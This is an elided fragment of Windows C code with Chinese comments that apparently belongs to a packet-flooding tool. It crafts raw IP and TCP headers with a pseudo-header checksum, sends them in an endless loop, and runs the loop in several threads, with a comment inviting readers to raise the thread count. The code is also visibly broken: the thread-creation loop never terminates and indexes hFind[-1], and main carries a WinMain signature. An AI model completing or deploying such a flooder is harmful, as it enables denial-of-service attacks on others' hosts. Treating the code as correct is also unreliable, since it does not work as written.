...
DWORD WINAPI Statr(void)  {  
	...
	while(TRUE)  {  
		...
		tcpHeader.th_urp=0; 
		tcpHeader.th_sum=0;   //填充TCP伪首部用来计算TCP头部的效验和 
		psdHeader.saddr=ipHeader.SourceIP; 
		psdHeader.daddr=ipHeader.DestIP;  
		psdHeader.mbz=0;  
		psdHeader.ptcl=IPPROTO_TCP;  
		psdHeader.tcpl=htons(sizeof(tcpHeader));    //计算校验和   
		char SendBuff[100]="fdsfdsf";   
		...
		memcpy(SendBuff+sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader));    //发送数据包  
...
int main(HINSTANCE hInstance,  HINSTANCE hPrevInstance,  LPSTR lpCmdLine,  int nCmdShow)   { 
	//启动线程，10，大家可以自己改  
	for(int i=0;i<10;i++)  {  
		hFind[i-1]=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)Statr,0,0,NULL);  i--;  }
	while(1){
		Sleep(1000);
	}
	return 0; 
